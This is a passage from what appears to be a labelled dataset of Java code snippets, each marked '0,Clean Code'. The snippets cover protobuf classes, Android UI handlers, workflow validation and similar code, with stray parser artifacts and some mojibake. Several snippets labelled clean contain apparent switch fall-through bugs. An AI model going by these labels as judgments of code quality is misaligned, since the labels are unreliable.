  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",0,Clean Code
"private XGBoostModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private XGBoostModelProto(){
  models_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1a2f7bb8",0,Clean Code
"@Override protected void onEmojiSelected(View emojiView,Long documentId,TLRPC.Document document,Integer until){
  TLRPC.EmojiStatus emojiStatus;
  if (documentId == null) {
    emojiStatus=new TLRPC.TL_emojiStatusEmpty();
  }
 else   if (until != null) {
    emojiStatus=new TLRPC.TL_emojiStatusUntil();
    ((TLRPC.TL_emojiStatusUntil)emojiStatus).document_id=documentId;
    ((TLRPC.TL_emojiStatusUntil)emojiStatus).until=until;
  }
 else {
    emojiStatus=new TLRPC.TL_emojiStatus();
    ((TLRPC.TL_emojiStatus)emojiStatus).document_id=documentId;
  }
  MessagesController.getInstance(currentAccount).updateEmojiStatus(emojiStatus);
  TLRPC.User user=UserConfig.getInstance(currentAccount).getCurrentUser();
  if (user != null) {
    for (int i=0; i < sideMenu.getChildCount(); ++i) {
      View child=sideMenu.getChildAt(i);
      if (child instanceof DrawerUserCell) {
        ((DrawerUserCell)child).setAccount(((DrawerUserCell)child).getAccountNumber());
      }
 else       if (child instanceof DrawerProfileCell) {
        if (documentId != null) {
          ((DrawerProfileCell)child).animateStateChange(documentId);
        }
        ((DrawerProfileCell)child).setUser(user,drawerLayoutAdapter.isAccountsShown());
      }
 else       if (child instanceof DrawerActionCell && drawerLayoutAdapter.getId(sideMenu.getChildAdapterPosition(child)) == 15) {
        boolean hasStatus=user.emoji_status instanceof TLRPC.TL_emojiStatus || user.emoji_status instanceof TLRPC.TL_emojiStatusUntil && ((TLRPC.TL_emojiStatusUntil)user.emoji_status).until > (int)(System.currentTimeMillis() / 1000);
        ((DrawerActionCell)child).updateText(hasStatus ? LocaleController.getString(""ChangeEmojiStatus"",R.string.ChangeEmojiStatus) : LocaleController.getString(""SetEmojiStatus"",R.string.SetEmojiStatus));
        ((DrawerActionCell)child).updateIcon(hasStatus ? R.raw.emoji_status_change_to_set : R.raw.emoji_status_set_to_change);
      }
    }
  }
  if (popup[0] != null) {
    selectAnimatedEmojiDialog=null;
    popup[0].dismiss();
  }
}",0,Clean Code
"/** 
 * Safely JSON decodes a given string.
 * @param jsonData The JSON-encoded data.
 * @return JSON decoded data, or null if an exception occurred.
 */
public static <T>T decode(String jsonData,Class<T> classType){
  try {
    return gson.fromJson(jsonData,classType);
  }
 catch (  Exception ignored) {
    return null;
  }
}
",0,Clean Code
"public PromptTransformingChatService build(){
  return new PromptTransformingChatService(chatClient,retrievers,documentPostProcessors,augmentors,chatServiceListeners);
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 10;</code>
 * @return this
 */
public StartRogueScRsp clearLineup(){
  bitField0_&=~0x00000004;
  lineup.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 plane_id = 7;</code>
 * @return this
 */
public EnteredSceneInfo clearPlaneId(){
  bitField0_&=~0x00000001;
  planeId=0;
  return this;
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == android.R.id.home) {
    finish();
    return true;
  }
  if (model == null)   return true;
  if (id == R.id.action_toggle_kill) {
    mEnableKillForSystem=!mEnableKillForSystem;
    Prefs.RunningApps.setEnableKillForSystemApps(mEnableKillForSystem);
    refresh();
  }
 else   if (id == R.id.action_sort_by_pid) {
    model.setSortOrder(SORT_BY_PID);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_process_name) {
    model.setSortOrder(SORT_BY_PROCESS_NAME);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_apps_first) {
    model.setSortOrder(SORT_BY_APPS_FIRST);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_memory_usage) {
    model.setSortOrder(SORT_BY_MEMORY_USAGE);
    item.setChecked(true);
  }
 else   if (id == R.id.action_filter_apps) {
    if (!item.isChecked())     model.addFilter(FILTER_APPS);
 else     model.removeFilter(FILTER_APPS);
    item.setChecked(!item.isChecked());
  }
 else   if (id == R.id.action_filter_user_apps) {
    if (!item.isChecked())     model.addFilter(FILTER_USER_APPS);
 else     model.removeFilter(FILTER_USER_APPS);
    item.setChecked(!item.isChecked());
  }
 else   return super.onOptionsItemSelected(item);
  return true;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 display_support_avatar_vec = 3;</code>
 * @return this
 */
public GetPlayerBoardDataScRsp clearDisplaySupportAvatarVec(){
  bitField0_&=~0x00000010;
  displaySupportAvatarVec.clear();
  return this;
}",0,Clean Code
"@Override public void close(){
  try {
    this.fileReader.close();
  }
 catch (  IOException e) {
    throw new IOError(e);
  }
}
",0,Clean Code
"public void loadMetadata(WorkflowDef workflowDef){
  metadataClient.registerWorkflowDef(workflowDef);
}
public void loadMetadata(List<TaskDef> taskDefs){
  metadataClient.registerTaskDefs(taskDefs);
}
",0,Clean Code
"public PercentageTwoBarIcon(final PercentageTwoBarCellData data,final Color leftBar,final Color rightBar,final Color emptyBar,final Color leftText,final Color totalText,final Color rightText,final Color selectionColor,final boolean selected,final int xOffset,final int yOffset,final int width,final int height){
  this.totalText=Integer.toString(data.getTotalBarValue());
  this.leftText=Integer.toString(data.getLeftBarValue());
  this.rightText=Integer.toString(data.getRightBarValue());
  this.leftValue=data.getLeftBarValue();
  this.rightValue=data.getRightBarValue();
  this.selected=selected;
  this.width=width;
  this.height=height;
  this.xOffset=xOffset;
  this.yOffset=yOffset;
  this.leftBarColor=leftBar;
  this.rightBarColor=rightBar;
  this.emptyBarColor=emptyBar;
  this.leftTextColor=leftText;
  this.totalTextColor=totalText;
  this.rightTextColor=rightText;
  this.selectionColor=selectionColor;
}
",0,Clean Code
"@Override public String getTaskType(){
  return TaskType.HTTP.name();
}
",0,Clean Code
"public void setTextAndValueAndTypeAndThumb(String text,String value,String type,String thumb,int resId,boolean divider){
  nameTextView.setText(text);
  dateTextView.setText(value);
  if (type != null) {
    extTextView.setVisibility(VISIBLE);
    extTextView.setText(type.toLowerCase());
  }
 else {
    extTextView.setVisibility(INVISIBLE);
  }
  needDivider=divider;
  if (resId == 0) {
    placeholderImageView.setImageResource(AndroidUtilities.getThumbForNameOrMime(text,type,false));
    placeholderImageView.setVisibility(VISIBLE);
  }
 else {
    placeholderImageView.setVisibility(INVISIBLE);
  }
  if (thumb != null || resId != 0) {
    if (thumb != null) {
      if (viewType != VIEW_TYPE_CACHE) {
        thumbImageView.setImage(thumb,""42_42"",null);
      }
    }
 else {
      Drawable drawable=Theme.createCircleDrawableWithIcon(AndroidUtilities.dp(42),resId);
      int iconKey;
      int backKey;
      if (resId == R.drawable.files_storage) {
        backKey=Theme.key_chat_attachLocationBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_gallery) {
        backKey=Theme.key_chat_attachContactBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_music) {
        backKey=Theme.key_chat_attachAudioBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_internal) {
        backKey=Theme.key_chat_attachGalleryBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else {
        backKey=Theme.key_files_folderIconBackground;
        iconKey=Theme.key_files_folderIcon;
      }
      Theme.setCombinedDrawableColor(drawable,getThemedColor(backKey),false);
      Theme.setCombinedDrawableColor(drawable,getThemedColor(iconKey),true);
      thumbImageView.setImageDrawable(drawable);
    }
    thumbImageView.setVisibility(VISIBLE);
  }
 else {
    extTextView.setAlpha(1.0f);
    placeholderImageView.setAlpha(1.0f);
    if (viewType != VIEW_TYPE_CACHE) {
      thumbImageView.setImageBitmap(null);
      thumbImageView.setVisibility(INVISIBLE);
    }
  }
  setWillNotDraw(!needDivider);
}",0,Clean Code
"public ArrayList<GProScheduleUser> getAcceptedUser(){
  return this.acceptedUser;
}
",0,Clean Code
"public String getTitle(){
  return this.title;
}
",0,Clean Code
"public String codecClassName(Class<?> beanClass){
  return codecClassName(beanClass,"""");
}
public String codecClassName(Class<?> beanClass,String prefix){
  String name=ReflectionUtils.getClassNameWithoutPackage(beanClass) + prefix + codecSuffix()+ CodeGenerator.getClassUniqueId(beanClass);
  return name.replace(""$"",""_"");
}
",0,Clean Code
"@Override public DoGachaCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  gachaRandom=0;
  gachaId=0;
  simulateMagic=0;
  gachaNum=0;
  return this;
}",0,Clean Code
"public static void setAdvanceTime(int i){
  getConfig().advanceTime=i;
  hasChanged=true;
}
",0,Clean Code
"/** 
 * <code>optional string signature = 8;</code>
 * @param value the signature to set
 * @return this
 */
public SetSignatureCsReq setSignature(final CharSequence value){
  bitField0_|=0x00000001;
  signature.copyFrom(value);
  return this;
}
/** 
 * <code>optional string signature = 8;</code>
 * @param value the signature to set
 * @return this
 */
public SetSignatureCsReq setSignature(final Utf8String value){
  bitField0_|=0x00000001;
  signature.copyFrom(value);
  return this;
}",0,Clean Code
"T convertDataSize(VmDataSize value,Iterable<Object> path);
",0,Clean Code
"@Nullable private BlockPos findPlacePos(BlockPos targetPlacePos){
switch (placePositions.get()) {
case All:
{
      if (isValidPlace(targetPlacePos,0,-1,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,0,2,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,1,0,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,-1,0,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,0,0,1))       return mutable;
 else       if (isValidPlace(targetPlacePos,0,0,-1))       return mutable;
 else       if (isValidPlace(targetPlacePos,1,1,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,-1,-1,0))       return mutable;
 else       if (isValidPlace(targetPlacePos,0,1,1))       return mutable;
 else       if (isValidPlace(targetPlacePos,0,0,-1))       return mutable;
    }
case Above:
{
    if (isValidPlace(targetPlacePos,0,2,0))     return mutable;
  }
case AboveAndBelow:
{
  if (isValidPlace(targetPlacePos,0,-1,0))   return mutable;
 else   if (isValidPlace(targetPlacePos,0,2,0))   return mutable;
}
case Around:
{
if (isValidPlace(targetPlacePos,0,0,-1)) return mutable;
 else if (isValidPlace(targetPlacePos,1,0,0)) return mutable;
 else if (isValidPlace(targetPlacePos,-1,0,0)) return mutable;
 else if (isValidPlace(targetPlacePos,0,0,1)) return mutable;
}
}
return null;
}",0,Clean Code
"public boolean isExampleWritten(){
  return isExampleWritten;
}
",0,Clean Code
"public ClassMember(@Nullable String docComment,SourceLocation sourceLocation,Set<Modifier> modifiers,List<PObject> annotations,String simpleName,PClass owner){
  super(docComment,sourceLocation,modifiers,annotations,simpleName);
  this.owner=owner;
}
",0,Clean Code
"List<? extends ICodeEdge<?>> getBasicBlockEdges();
",0,Clean Code
"public long getMinimumHierarchicNodeDistance(){
  return hierarchicalLayoutMinNodeDistance;
}
",0,Clean Code
"@Nullable @Override public View onCreateView(LayoutInflater inflater,final ViewGroup container,Bundle savedInstanceState){
  resolveTheme();
  LayoutInflater localInflater=getThemeInflater(inflater);
  final ViewGroup view=(ViewGroup)localInflater.inflate(R.layout.lb_onboarding_fragment,container,false);
  mIsLtr=getResources().getConfiguration().getLayoutDirection() == View.LAYOUT_DIRECTION_LTR;
  mPageIndicator=(PagingIndicator)view.findViewById(R.id.page_indicator);
  mPageIndicator.setOnClickListener(mOnClickListener);
  mPageIndicator.setOnKeyListener(mOnKeyListener);
  mStartButton=view.findViewById(R.id.button_start);
  mStartButton.setOnClickListener(mOnClickListener);
  mStartButton.setOnKeyListener(mOnKeyListener);
  mMainIconView=(ImageView)view.findViewById(R.id.main_icon);
  mLogoView=(ImageView)view.findViewById(R.id.logo);
  mTitleView=(TextView)view.findViewById(R.id.title);
  mDescriptionView=(TextView)view.findViewById(R.id.description);
  if (mTitleViewTextColorSet) {
    mTitleView.setTextColor(mTitleViewTextColor);
  }
  if (mDescriptionViewTextColorSet) {
    mDescriptionView.setTextColor(mDescriptionViewTextColor);
  }
  if (mDotBackgroundColorSet) {
    mPageIndicator.setDotBackgroundColor(mDotBackgroundColor);
  }
  if (mArrowColorSet) {
    mPageIndicator.setArrowColor(mArrowColor);
  }
  if (mArrowBackgroundColorSet) {
    mPageIndicator.setDotBackgroundColor(mArrowBackgroundColor);
  }
  if (mStartButtonTextSet) {
    ((Button)mStartButton).setText(mStartButtonText);
  }
  final Context context=FragmentUtil.getContext(OnboardingFragment.this);
  if (sSlideDistance == 0) {
    sSlideDistance=(int)(SLIDE_DISTANCE * context.getResources().getDisplayMetrics().scaledDensity);
  }
  view.requestFocus();
  return view;
}",0,Clean Code
"@Override public boolean isValid(WorkflowTask workflowTask,ConstraintValidatorContext context){
  context.disableDefaultConstraintViolation();
  boolean valid=true;
switch (workflowTask.getType()) {
case TaskType.TASK_TYPE_EVENT:
    valid=isEventTaskValid(workflowTask,context);
  break;
case TaskType.TASK_TYPE_DECISION:
valid=isDecisionTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SWITCH:
valid=isSwitchTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DYNAMIC:
valid=isDynamicTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN_DYNAMIC:
valid=isDynamicForkJoinValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_HTTP:
valid=isHttpTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN:
valid=isForkJoinTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_TERMINATE:
valid=isTerminateTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_KAFKA_PUBLISH:
valid=isKafkaPublishTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DO_WHILE:
valid=isDoWhileTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SUB_WORKFLOW:
valid=isSubWorkflowTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_JSON_JQ_TRANSFORM:
valid=isJSONJQTransformTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_WAIT:
valid=isWaitTaskValid(workflowTask,context);
break;
}
return valid;
}
",0,Clean Code
"public void setSelfIsConfessor(boolean z){
}
",0,Clean Code
"public static ImageIcon getImageIcon(final String imagePath){
  return getImageIcon(imagePath,null);
}
public static ImageIcon getImageIcon(final String imagePath,final Component component){
  return new ImageIcon(getImage(imagePath,component));
}
",0,Clean Code
"private boolean hasChanges(){
  if (rulesType == PRIVACY_RULES_TYPE_LASTSEEN && (currentType != TYPE_EVERYBODY || currentMinus != null && !currentMinus.isEmpty()) && currentReadValue != selectedReadValue) {
    return true;
  }
  if (initialRulesType != currentType) {
    return true;
  }
  if (rulesType == PRIVACY_RULES_TYPE_PHONE && currentType == TYPE_NOBODY && initialRulesSubType != currentSubType) {
    return true;
  }
  if (currentType != 0 && initialPlusPremium[currentType == TYPE_CONTACTS ? 0 : 1] != currentPlusPremium[currentType == TYPE_CONTACTS ? 0 : 1]) {
    return true;
  }
  if (initialMinus.size() != currentMinus.size()) {
    return true;
  }
  if (initialPlus.size() != currentPlus.size()) {
    return true;
  }
  Collections.sort(initialPlus);
  Collections.sort(currentPlus);
  if (!initialPlus.equals(currentPlus)) {
    return true;
  }
  Collections.sort(initialMinus);
  Collections.sort(currentMinus);
  if (!initialMinus.equals(currentMinus)) {
    return true;
  }
  return false;
}",0,Clean Code
"public void onPrepareOptionsMenu(@NonNull Menu menu){
  List<String> scopeList=module.getScopeList();
  if (scopeList == null || scopeList.isEmpty()) {
    menu.removeItem(R.id.use_recommended);
  }
  menu.findItem(R.id.item_filter_system).setChecked(preferences.getBoolean(""filter_system_apps"",true));
  menu.findItem(R.id.item_filter_games).setChecked(preferences.getBoolean(""filter_games"",true));
  menu.findItem(R.id.item_filter_modules).setChecked(preferences.getBoolean(""filter_modules"",true));
  menu.findItem(R.id.item_filter_denylist).setChecked(preferences.getBoolean(""filter_denylist"",false));
switch (preferences.getInt(""list_sort"",0)) {
case 7:
{
      menu.findItem(R.id.item_sort_by_update_time).setChecked(true);
      menu.findItem(R.id.reverse).setChecked(true);
    }
case 6:
  ;
case 5:
{
  menu.findItem(R.id.item_sort_by_install_time).setChecked(true);
  menu.findItem(R.id.reverse).setChecked(true);
}
case 4:
;
case 3:
{
menu.findItem(R.id.item_sort_by_package_name).setChecked(true);
menu.findItem(R.id.reverse).setChecked(true);
}
case 2:
;
case 1:
{
menu.findItem(R.id.item_sort_by_name).setChecked(true);
menu.findItem(R.id.reverse).setChecked(true);
}
case 0:
;
}
menu.findItem(R.id.automatic_add).setChecked(ConfigManager.getAutomaticAdd(module.packageName));
}",0,Clean Code
"private TensorTupleProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TensorTupleProto(){
  className_="""";
  shape_=emptyLongList();
  data_=com.google.protobuf.ByteString.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3e544114",0,Clean Code
"@Override public LocallyAdaptiveVectorQuantization.PackedVector getPackedVector(int ordinal){
  try {
    var reader=source.inlineReaderForNode(ordinal,FeatureId.LVQ);
    var bias=reader.readFloat();
    var scale=reader.readFloat();
    var tlBytes=reusableBytes.get();
    OnDiskGraphIndex.vectorTypeSupport.readByteSequence(reader,tlBytes);
    return new LocallyAdaptiveVectorQuantization.PackedVector(tlBytes,bias,scale);
  }
 catch (  IOException e) {
    throw new RuntimeException(e);
  }
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(slot);
  }
  return size;
}",0,Clean Code
"@Override public D getGenericDeclaration(){
  return genericDeclaration;
}
",0,Clean Code
"public void removeRow(final Diff diff){
  ((FunctionDiffViewsContainerTableModel)getTableModel()).removeRow(diff);
  updateUI();
}
",0,Clean Code
"public TrueLiteralNode(SourceSection sourceSection){
  super(sourceSection);
}
",0,Clean Code
"/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final CAddress address){
  return (address != null) && (this.address == address.address);
}
/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final IAddress address){
  return (address != null) && (this.address == address.toLong());
}
/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final long address){
  return this.address == address;
}
@Override public boolean equals(final Object address){
  return (address instanceof IAddress) && (this.address == ((IAddress)address).toLong());
}
",0,Clean Code
"public NonNullTypeAliasTypeNode(){
  super(VmUtils.unavailableSourceSection());
}
",0,Clean Code
"@Override public GetFirstTalkNpcCsReq clone(){
  return new GetFirstTalkNpcCsReq().copyFrom(this);
}
",0,Clean Code
"/** 
 * @param password Redis Stack password (optional)
 */
public Builder password(String password){
  this.password=password;
  return this;
}
",0,Clean Code
"private List<Message> mapGetMessagesResponse(SearchResponse response) throws IOException {
  SearchHit[] hits=response.getHits().getHits();
  TypeFactory factory=TypeFactory.defaultInstance();
  MapType type=factory.constructMapType(HashMap.class,String.class,String.class);
  List<Message> messages=new ArrayList<>(hits.length);
  for (  SearchHit hit : hits) {
    String source=hit.getSourceAsString();
    Map<String,String> mapSource=objectMapper.readValue(source,type);
    Message msg=new Message(mapSource.get(""messageId""),mapSource.get(""payload""),null);
    messages.add(msg);
  }
  return messages;
}
",0,Clean Code
"@Override public HrmSalaryMonthRecord computeSalaryCount(HrmSalaryMonthRecord salaryMonthRecord){
  List<Long> empRecordIds=salaryMonthRecordMapper.queryDeleteEmpRecordIds(salaryMonthRecord.getSRecordId());
  if (CollUtil.isNotEmpty(empRecordIds)) {
    salaryMonthOptionValueService.lambdaUpdate().in(HrmSalaryMonthOptionValue::getSEmpRecordId,empRecordIds).remove();
    salaryMonthEmpRecordService.lambdaUpdate().in(HrmSalaryMonthEmpRecord::getSEmpRecordId,empRecordIds).remove();
  }
  Integer num=salaryMonthEmpRecordService.lambdaQuery().eq(HrmSalaryMonthEmpRecord::getSRecordId,salaryMonthRecord.getSRecordId()).count().intValue();
  salaryMonthRecord.setNum(num);
  List<SalaryOptionHeadVO> salaryOptionHeadVOList=querySalaryOptionHead();
  salaryMonthRecord.setOptionHead(JSON.toJSONString(salaryOptionHeadVOList));
  Map<String,Object> countMap=salaryMonthRecordMapper.queryMonthSalaryCount(salaryMonthRecord.getSRecordId());
  return BeanUtil.fillBeanWithMap(countMap,salaryMonthRecord,true);
}
",0,Clean Code
"public void checkMediaExistance(){
  checkMediaExistance(true);
}
public void checkMediaExistance(boolean useFileDatabaseQueue){
  File cacheFile=null;
  attachPathExists=false;
  mediaExists=false;
  if (type == TYPE_EXTENDED_MEDIA_PREVIEW) {
    TLRPC.TL_messageExtendedMediaPreview preview=(TLRPC.TL_messageExtendedMediaPreview)messageOwner.media.extended_media;
    if (preview.thumb != null) {
      File file=FileLoader.getInstance(currentAccount).getPathToAttach(preview.thumb,useFileDatabaseQueue);
      if (!mediaExists) {
        mediaExists=file.exists() || preview.thumb instanceof TLRPC.TL_photoStrippedSize;
      }
    }
  }
 else   if (type == TYPE_PHOTO) {
    TLRPC.PhotoSize currentPhotoObject=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,AndroidUtilities.getPhotoSize());
    if (currentPhotoObject != null) {
      File file=FileLoader.getInstance(currentAccount).getPathToMessage(messageOwner,useFileDatabaseQueue);
      if (needDrawBluredPreview()) {
        mediaExists=new File(file.getAbsolutePath() + "".enc"").exists();
      }
      if (!mediaExists) {
        mediaExists=file.exists();
      }
    }
  }
  if (!mediaExists && type == TYPE_GIF || type == TYPE_VIDEO || type == TYPE_FILE || type == TYPE_VOICE || type == TYPE_MUSIC || type == TYPE_ROUND_VIDEO) {
    if (messageOwner.attachPath != null && messageOwner.attachPath.length() > 0) {
      File f=new File(messageOwner.attachPath);
      attachPathExists=f.exists();
    }
    if (!attachPathExists) {
      File file=FileLoader.getInstance(currentAccount).getPathToMessage(messageOwner,useFileDatabaseQueue);
      if (type == TYPE_VIDEO && needDrawBluredPreview() || isVoiceOnce() || isRoundOnce()) {
        mediaExists=new File(file.getAbsolutePath() + "".enc"").exists();
      }
      if (!mediaExists) {
        mediaExists=file.exists();
      }
    }
  }
  if (!mediaExists) {
    TLRPC.Document document=getDocument();
    if (document != null) {
      if (isWallpaper()) {
        mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(document,null,true,useFileDatabaseQueue).exists();
      }
 else {
        mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(document,null,false,useFileDatabaseQueue).exists();
      }
    }
 else     if (type == MessageObject.TYPE_TEXT) {
      TLRPC.PhotoSize currentPhotoObject=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,AndroidUtilities.getPhotoSize());
      if (currentPhotoObject == null) {
        return;
      }
      mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(currentPhotoObject,null,true,useFileDatabaseQueue).exists();
    }
 else     if (type == MessageObject.TYPE_ACTION_PHOTO) {
      TLRPC.Photo photo=messageOwner.action.photo;
      if (photo == null || photo.video_sizes.isEmpty()) {
        return;
      }
      mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(photo.video_sizes.get(0),null,true,useFileDatabaseQueue).exists();
    }
  }
}",0,Clean Code
"public int getClientId(){
  return this.clientId;
}
",0,Clean Code
"@Override public float cosine(VectorFloat<?> v1,VectorFloat<?> v2){
  return SimdOps.cosineSimilarity((ArrayVectorFloat)v1,(ArrayVectorFloat)v2);
}
@Override public float cosine(VectorFloat<?> a,int aoffset,VectorFloat<?> b,int boffset,int length){
  return SimdOps.cosineSimilarity((ArrayVectorFloat)a,aoffset,(ArrayVectorFloat)b,boffset,length);
}",0,Clean Code
"@Override public Optional<Object> read(URI uri){
  assert uri.getScheme().equals(""env"");
  var context=VmContext.get(null);
  var value=context.getEnvironmentVariables().get(uri.getSchemeSpecificPart());
  return Optional.ofNullable(value);
}
",0,Clean Code
"public long getMaxCntSeq(){
  return this.maxCntSeq;
}
",0,Clean Code
"public Object getDefaultValue(){
  return defaultValue == null ? VmDynamic.empty() : defaultValue;
}
",0,Clean Code
"/** 
 * Retrieves messages for a specified chat memory.
 * @param memoryId The ID of the chat memory.
 * @return List of messages for the specified chat memory. Must not be null. Can be deserialized from JSON using {@link ChatMessageDeserializer}.
 */
List<ChatMessage> getMessages(Object memoryId);
",0,Clean Code
"@Override public byte[] get(){
  return data;
}
@Override public byte get(int n){
  return data[n];
}
",0,Clean Code
"@Override public ComposeItemScRsp mergeFrom(final ComposeItemScRsp other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasCount()) {
    setCount(other.count);
  }
  if (other.hasRetcode()) {
    setRetcode(other.retcode);
  }
  if (other.hasComposeId()) {
    setComposeId(other.composeId);
  }
  if (other.hasReturnItemList()) {
    getMutableReturnItemList().mergeFrom(other.returnItemList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@65f61d!org.eclipse.jdt.core.dom.MethodDeclaration@fe4bec9",0,Clean Code
"public void hide(){
  hide(true);
}
public void hide(boolean animate){
  if (getTag() == null) {
    return;
  }
  setTag(null);
  if (hideRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(hideRunnable);
    hideRunnable=null;
  }
  if (animatorSet != null) {
    animatorSet.cancel();
    animatorSet=null;
  }
  if (animate) {
    animatorSet=new AnimatorSet();
    if (useScale) {
      animatorSet.playTogether(ObjectAnimator.ofFloat(this,View.ALPHA,1.0f,0.0f),ObjectAnimator.ofFloat(this,View.SCALE_Y,1.0f,0.5f),ObjectAnimator.ofFloat(this,View.SCALE_X,1.0f,0.5f));
      animatorSet.setDuration(150);
      animatorSet.setInterpolator(CubicBezierInterpolator.DEFAULT);
    }
 else {
      animatorSet.playTogether(ObjectAnimator.ofFloat(this,View.ALPHA,0.0f));
      animatorSet.setDuration(300);
    }
    animatorSet.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        setVisibility(View.INVISIBLE);
        if (visibleListener != null) {
          visibleListener.onVisible(false);
        }
        currentView=null;
        messageCell=null;
        animatorSet=null;
      }
    }
);
    animatorSet.start();
  }
 else {
    setVisibility(View.INVISIBLE);
    if (visibleListener != null) {
      visibleListener.onVisible(false);
    }
    currentView=null;
    messageCell=null;
    animatorSet=null;
  }
}",0,Clean Code
"/** 
 * Processes  {@link #outputBuffer} by rendering it, skipping it or doing nothing, and returnswhether it may be possible to process another output buffer.
 * @param positionUs The player's current position.
 * @param elapsedRealtimeUs {@link android.os.SystemClock#elapsedRealtime()} in microseconds,measured at the start of the current iteration of the rendering loop.
 * @return Whether it may be possible to drain another output buffer.
 * @throws ExoPlaybackException If an error occurs processing the output buffer.
 */
private boolean processOutputBuffer(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException, VpxDecoderException {
  if (initialPositionUs == C.TIME_UNSET) {
    initialPositionUs=positionUs;
  }
  long earlyUs=outputBuffer.timeUs - positionUs;
  if (outputMode == VpxDecoder.OUTPUT_MODE_NONE) {
    if (isBufferLate(earlyUs)) {
      skipOutputBuffer(outputBuffer);
      return true;
    }
    return false;
  }
  long presentationTimeUs=outputBuffer.timeUs - outputStreamOffsetUs;
  Format format=formatQueue.pollFloor(presentationTimeUs);
  if (format != null) {
    outputFormat=format;
  }
  long elapsedRealtimeNowUs=SystemClock.elapsedRealtime() * 1000;
  boolean isStarted=getState() == STATE_STARTED;
  if (!renderedFirstFrame || (isStarted && shouldForceRenderOutputBuffer(earlyUs,elapsedRealtimeNowUs - lastRenderTimeUs))) {
    if (frameMetadataListener != null) {
      frameMetadataListener.onVideoFrameAboutToBeRendered(presentationTimeUs,System.nanoTime(),outputFormat);
    }
    renderOutputBuffer(outputBuffer);
    return true;
  }
  if (!isStarted || positionUs == initialPositionUs) {
    return false;
  }
  if (shouldDropBuffersToKeyframe(earlyUs,elapsedRealtimeUs) && maybeDropBuffersToKeyframe(positionUs)) {
    return false;
  }
 else   if (shouldDropOutputBuffer(earlyUs,elapsedRealtimeUs)) {
    dropOutputBuffer(outputBuffer);
    return true;
  }
  if (earlyUs < 30000) {
    if (frameMetadataListener != null) {
      frameMetadataListener.onVideoFrameAboutToBeRendered(presentationTimeUs,System.nanoTime(),outputFormat);
    }
    renderOutputBuffer(outputBuffer);
    return true;
  }
  return false;
}",0,Clean Code
"@ApiOperation(""鏌ョ湅鑰冩牳璁″垝鍒楄〃"") @PostMapping(""/queryPageList"") public Result<BasePage<AppraisalPlanVO>> queryPageList(@RequestBody QueryAppraisalPlanBO queryAppraisalPlanBO){
  BasePage<AppraisalPlanVO> planList=hrmAppraisalPlanService.queryPageList(queryAppraisalPlanBO);
  return Result.ok(planList);
}
",0,Clean Code
"/** 
 * Create a heap buffer of specified initial size. The buffer will grow automatically if not enough.
 */
public static MemoryBuffer newHeapBuffer(int initialSize){
  return fromByteArray(new byte[initialSize]);
}
",0,Clean Code
"public String toString(){
  return ""GProUpdateChannelThemeReq{uint64GuildId="" + this.uint64GuildId + "",uint64ChannelId=""+ this.uint64ChannelId+ "",authMeta=""+ this.authMeta+ "",themeType=""+ this.themeType+ "",}"";
}",0,Clean Code
"public ResScalarValue factory(int type,int value,String rawValue) throws IOException {
switch (type) {
case TypedValue.TYPE_NULL:
    return new ResReferenceValue(mPackage,0,null);
case TypedValue.TYPE_REFERENCE:
  return newReference(value,rawValue);
case TypedValue.TYPE_ATTRIBUTE:
return newReference(value,rawValue,true);
case TypedValue.TYPE_STRING:
return new ResStringValue(rawValue,value);
